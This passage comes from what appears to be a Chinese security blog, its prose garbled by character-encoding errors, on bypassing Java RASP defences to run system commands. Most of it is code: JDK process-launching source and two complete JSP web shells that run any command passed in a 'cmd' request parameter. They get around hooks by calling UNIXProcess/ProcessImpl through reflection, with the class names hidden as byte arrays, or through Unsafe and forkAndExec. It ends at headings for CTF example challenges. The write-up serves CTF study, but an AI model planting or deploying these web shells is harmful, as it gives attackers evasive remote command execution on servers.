sun.misc.SharedSecrets.getJavaIOFileDescriptorAccess();<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-title function_">ProcessImpl</span><span class="hljs-params">()</span> &#123;&#125;    <span class="hljs-comment">// Not instantiable</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                         result, <span class="hljs-number">0</span>,<br>                         bytes.length);<br>        result[result.length-<span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>)<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    <span class="hljs-keyword">static</span> Process <span class="hljs-title function_">start</span><span class="hljs-params">(String[] cmdarray,</span><br><span class="hljs-params">                         java.util.Map&lt;String,String&gt; environment,</span><br><span class="hljs-params">                         String dir,</span><br><span class="hljs-params">                         ProcessBuilder.Redirect[] redirects,</span><br><span class="hljs-params">                         <span class="hljs-type">boolean</span> redirectErrorStream)</span><br>        <span class="hljs-keyword">throws</span> IOException<br>    &#123;<br>        <span class="hljs-keyword">assert</span> cmdarray != <span class="hljs-literal">null</span> &amp;&amp; cmdarray.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[cmdarray.length-<span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = cmdarray[i+<span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br><br>        <span class="hljs-type">int</span>[] envc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">byte</span>[] envBlock = ProcessEnvironment.toEnvironmentBlock(environment, envc);<br><br>        <span class="hljs-type">int</span>[] std_fds;<br><br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (redirects == <span class="hljs-literal">null</span>) &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[] &#123; -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span> &#125;;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">3</span>];<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">1</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">1</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">1</span>] = <span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">1</span>].file(),<br>                                              redirects[<span class="hljs-number">1</span>].append());<br>                    std_fds[<span class="hljs-number">1</span>] = fdAccess.get(f1.getFD());<br>                &#125;<br>                <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.PIPE)<br>                    std_fds[<span class="hljs-number">2</span>] = -<span class="hljs-number">1</span>;<br>                <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (redirects[<span class="hljs-number">2</span>] == Redirect.INHERIT)<br>                    std_fds[<span class="hljs-number">2</span>] = <span class="hljs-number">2</span>;<br>                <span class="hljs-keyword">else</span> &#123;<br>                    f2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(redirects[<span class="hljs-number">2</span>].file(),<br>                                              redirects[<span class="hljs-number">2</span>].append());<br>                    std_fds[<span class="hljs-number">2</span>] = fdAccess.get(f2.getFD());<br>                &#125;<br>            &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UNIXProcess</span><br>            (toCString(cmdarray[<span class="hljs-number">0</span>]),<br>             argBlock, args.length,<br>             envBlock, envc[<span class="hljs-number">0</span>],<br>             toCString(dir),<br>                 std_fds,<br>             redirectErrorStream);<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close(); &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">try</span> &#123; <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close(); &#125;<br>                <span class="hljs-keyword">finally</span> &#123; <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close(); &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>UNIXProcessæ¥æ”¶ 8ä¸ªå‚æ•°ï¼Œå…¶ä¸­envcæ˜¯[1]ä¸std_fdséƒ½æ˜¯æ’ä¸º-1çš„æ•°ç»„ï¼ŒredirectErrorStreamä¸å½±å“å¯ä¸ºfalseï¼Œargs.length ä¸º cmd.length - 1ï¼ŒargBlockçš„å†…å®¹å°±æ˜¯æ‰§è¡Œçš„å‘½ä»¤å†…å®¹ã€‚</p></blockquote><p>ä¸€ä¸ªjspçš„payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>, result, <span class="hljs-number">0</span>, bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>    InputStream <span class="hljs-title function_">start</span><span class="hljs-params">(String[] strs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// java.lang.UNIXProcess</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">unixClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        <span class="hljs-comment">// java.lang.ProcessImpl</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">73</span>, <span class="hljs-number">109</span>, <span class="hljs-number">112</span>, <span class="hljs-number">108</span>&#125;);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// åå°„åˆ›å»ºUNIXProcessæˆ–è€…ProcessImpl</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            clazz = Class.forName(unixClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            clazz = Class.forName(processClass);<br>        &#125;<br>        <span class="hljs-comment">// è·å–UNIXProcessæˆ–è€…ProcessImplçš„æ„é€ æ–¹æ³•</span><br>        Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">assert</span> strs != <span class="hljs-literal">null</span> &amp;&amp; strs.length &gt; <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Convert arguments to a contiguous block; it&#x27;s easier to do</span><br>        <span class="hljs-comment">// memory management in Java than in C.</span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <span class="hljs-comment">// For added NUL bytes</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>            <span class="hljs-comment">// No need to write NUL bytes explicitly</span><br>        &#125;<br>        <span class="hljs-type">int</span>[] envc    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-type">FileInputStream</span>  <span class="hljs-variable">f0</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f1</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">f2</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-comment">// In theory, close() can throw IOException</span><br>        <span class="hljs-comment">// (although it is rather unlikely to happen here)</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (f0 != <span class="hljs-literal">null</span>) f0.close();<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">if</span> (f1 != <span class="hljs-literal">null</span>) f1.close();<br>            &#125; <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> (f2 != <span class="hljs-literal">null</span>) f2.close();<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// åˆ›å»ºUNIXProcessæˆ–è€…ProcessImplå®ä¾‹</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">object</span> <span class="hljs-operator">=</span> constructor.newInstance(<br>                toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        );<br>        <span class="hljs-comment">// è·å–å‘½ä»¤æ‰§è¡Œçš„InputStream</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">inMethod</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        inMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">return</span> (InputStream) inMethod.invoke(object);<br>    &#125;<br>    String <span class="hljs-title function_">inputStreamToString</span><span class="hljs-params">(InputStream in, String charset)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (charset == <span class="hljs-literal">null</span>) &#123;<br>                charset = <span class="hljs-string">&quot;UTF-8&quot;</span>;<br>            &#125;<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>   <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>            <span class="hljs-type">byte</span>[]                b   = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>                out.write(b, <span class="hljs-number">0</span>, a);<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(out.toByteArray());<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-keyword">if</span> (in != <span class="hljs-literal">null</span>)<br>                in.close();<br>        &#125;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] str = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (str != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span>     <span class="hljs-operator">=</span> start(str);<br>        <span class="hljs-type">String</span>      <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> inputStreamToString(in, <span class="hljs-string">&quot;UTF-8&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(result);<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h2 id="unsafeforkandexecç»•è¿‡"><a href="#Unsafe-forkAndExecç»•è¿‡" class="headerlink" title="Unsafe+forkAndExecç»•è¿‡"></a>Unsafe+forkAndExecç»•è¿‡</h2><p>é‚£å¦‚æœRASPæŠŠ<code>UNIXProcess/ProcessImpl</code>ç±»çš„æ„é€ æ–¹æ³•ç»™æ‹¦æˆªäº†å‘¢</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨javaçš„ä¸€äº›ç‰¹æ€§æ¥ç›´æ¥è§¦å‘<code>forkAndExec</code>æ–¹æ³•ä»è€Œç»•è¿‡è¿‡æ»¤</p><p>å…·ä½“çš„æ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>ä½¿ç”¨<code>sun.misc.Unsafe.allocateInstance(Class)</code>ç‰¹æ€§å¯ä»¥æ— éœ€<code>new</code>æˆ–è€…<code>newInstance</code>åˆ›å»º<code>UNIXProcess/ProcessImpl</code>ç±»å¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>forkAndExec</code>æ–¹æ³•ã€‚</li><li>æ„é€ <code>forkAndExec</code>éœ€è¦çš„å‚æ•°å¹¶è°ƒç”¨ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>initStreams</code>æ–¹æ³•åˆå§‹åŒ–è¾“å…¥è¾“å‡ºç»“æœæµå¯¹è±¡ã€‚</li><li>åå°„<code>UNIXProcess/ProcessImpl</code>ç±»çš„<code>getInputStream</code>æ–¹æ³•è·å–æœ¬åœ°å‘½ä»¤æ‰§è¡Œç»“æœ(å¦‚æœè¦è¾“å‡ºæµã€å¼‚å¸¸æµåå°„å¯¹åº”æ–¹æ³•å³å¯)ã€‚</li></ol><p>å› ä¸ºä¸å¤ªå¥½éªŒè¯ï¼Œç›´æ¥copyä¸€ä¸‹Aiwinå¸ˆå‚…çš„jsp payload</p><figure class="highlight jsp"><table><tr><td class="code"><pre><code class="hljs jsp">&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Method&quot;</span> %&gt;<br>&lt;%!<br>    <span class="hljs-type">byte</span>[] toCString(String s) &#123;<br>        <span class="hljs-keyword">if</span> (s == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">byte</span>[] bytes  = s.getBytes();<br>        <span class="hljs-type">byte</span>[] result = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[bytes.length + <span class="hljs-number">1</span>];<br>        System.arraycopy(bytes, <span class="hljs-number">0</span>,<br>                result, <span class="hljs-number">0</span>,<br>                bytes.length);<br>        result[result.length - <span class="hljs-number">1</span>] = (<span class="hljs-type">byte</span>) <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>%&gt;<br>&lt;%<br>    String[] strs = request.getParameterValues(<span class="hljs-string">&quot;cmd&quot;</span>);<br>    <span class="hljs-keyword">if</span> (strs != <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">theUnsafeField</span> <span class="hljs-operator">=</span> Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafeField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> (Unsafe) theUnsafeField.get(<span class="hljs-literal">null</span>); <span class="hljs-comment">//é€šè¿‡getæ–¹æ³•å¾—åˆ°unsafeå¯¹è±¡</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">processClass</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>            processClass = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">processObject</span> <span class="hljs-operator">=</span> unsafe.allocateInstance(processClass);<span class="hljs-comment">//åˆ›å»ºUNIXProcesså¯¹è±¡</span><br>        <span class="hljs-comment">//åŸä»£ç </span><br>        <span class="hljs-type">byte</span>[][] args = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[strs.length - <span class="hljs-number">1</span>][];<br>        <span class="hljs-type">int</span>      <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> args.length; <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; args.length; i++) &#123;<br>            args[i] = strs[i + <span class="hljs-number">1</span>].getBytes();<br>            size += args[i].length;<br>        &#125;<br>        <span class="hljs-type">byte</span>[] argBlock = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[size];<br>        <span class="hljs-type">int</span>    <span class="hljs-variable">i</span>        <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">byte</span>[] arg : args) &#123;<br>            System.arraycopy(arg, <span class="hljs-number">0</span>, argBlock, i, arg.length);<br>            i += arg.length + <span class="hljs-number">1</span>;<br>        &#125;<br>        <span class="hljs-type">int</span>[] envc                 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[<span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span>[] std_fds              = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[]&#123;-<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>&#125;;<br>        <span class="hljs-comment">//æ„é€ forkAndExecéœ€è¦çš„å‚æ•°</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">launchMechanismField</span> <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;launchMechanism&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">helperpathField</span>      <span class="hljs-operator">=</span> processClass.getDeclaredField(<span class="hljs-string">&quot;helperpath&quot;</span>);<br>        launchMechanismField.setAccessible(<span class="hljs-literal">true</span>);<br>        helperpathField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//ä»UNIXProcessä¸­å¾—åˆ°launchMechanismå’ŒHelperpath</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">launchMechanismObject</span> <span class="hljs-operator">=</span> launchMechanismField.get(processObject);<br>        <span class="hljs-type">byte</span>[] helperpathObject      = (<span class="hljs-type">byte</span>[]) helperpathField.get(processObject);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ordinal</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) launchMechanismObject.getClass().getMethod(<span class="hljs-string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);<br>       <span class="hljs-comment">//åå°„forkAndExecæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">forkMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;forkAndExec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<br>                <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class,<br>                <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>[].class, <span class="hljs-type">boolean</span>.class<br>        &#125;);<br>        forkMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">pid</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>) forkMethod.invoke(processObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<br>                ordinal + <span class="hljs-number">1</span>, helperpathObject, toCString(strs[<span class="hljs-number">0</span>]), argBlock, args.length,<br>                <span class="hljs-literal">null</span>, envc[<span class="hljs-number">0</span>], <span class="hljs-literal">null</span>, std_fds, <span class="hljs-literal">false</span><br>        &#125;);<br>        <span class="hljs-comment">// åˆå§‹åŒ–å‘½ä»¤æ‰§è¡Œç»“æœï¼Œå°†æœ¬åœ°å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºæµè½¬æ¢ä¸ºç¨‹åºæ‰§è¡Œç»“æœçš„è¾“å‡ºæµ</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">initStreamsMethod</span> <span class="hljs-operator">=</span> processClass.getDeclaredMethod(<span class="hljs-string">&quot;initStreams&quot;</span>, <span class="hljs-type">int</span>[].class);<br>        initStreamsMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        initStreamsMethod.invoke(processObject, std_fds);<br>        <span class="hljs-comment">//è·å–è¾“å‡ºå†…å®¹</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getInputStreamMethod</span> <span class="hljs-operator">=</span> processClass.getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br>        getInputStreamMethod.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">int</span>                   <span class="hljs-variable">a</span>    <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br>        <span class="hljs-type">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-keyword">while</span> ((a = in.read(b)) != -<span class="hljs-number">1</span>) &#123;<br>            baos.write(b, <span class="hljs-number">0</span>, a);<br>        &#125;<br>        out.println(<span class="hljs-string">&quot;&lt;pre&gt;&quot;</span>);<br>        out.println(baos.toString());<br>        out.println(<span class="hljs-string">&quot;&lt;/pre&gt;&quot;</span>);<br>        out.flush();<br>        out.close();<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h1 id="ä¾‹é¢˜åˆ†æ"><a href="#ä¾‹é¢˜åˆ†æ" class="headerlink" title="ä¾‹é¢˜åˆ†æ"></a>ä¾‹é¢˜åˆ†æ</h1><h2 id="mrctf-2022-springcoffee"><a href="#MRCTF-2022-springcoffee" class="headerlink" title="[MRCTF 2022] springcoffee"></a>[MRCTF 2022] springcoffee</h2><h2 id="å¼ºç½‘æ‹Ÿæ€2024-onlinerunner"><a href="#å¼ºç½‘æ‹Ÿæ€2024-OnlineRunner" class="headerlink" title="å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner"></a>å¼ºç½‘æ‹Ÿæ€2024 OnlineRunner</h2><p>è®°å¾—å½“æ—¶é¢˜ç›®æ˜¯ä¸€ä¸ªåœ¨çº¿çš„javaåœ¨çº¿å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼Œç›´æ¥è®©ä½ å†™Mainå‡½æ•°çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ä¹Ÿæ²¡åŠæ³•importç±»ï¼Œåªèƒ½ç›´æ¥å†™å…¨ç±»å</p><p>å½“æ—¶å°±æ˜¯å°è¯•äº†ä¸€ä¸‹æ­£å¸¸å‘½ä»¤æ‰§è¡Œpayloadå‘ç°ä¸å¤ªè¡Œï¼Œjavaæ²™ç®±ä¹Ÿä¸å¤ªä¼šç»•ä¸è¿‡å»ï¼Œé‚æ‘†ğŸ«¡</p><p>è¿™é¢˜æ²¡æœ‰é™„ä»¶ï¼Œå½“æ—¶ä¹Ÿæ²¡æ€ä¹ˆçœ‹ï¼Œç°åœ¨åªèƒ½çœ‹wpå­¦ä¹ 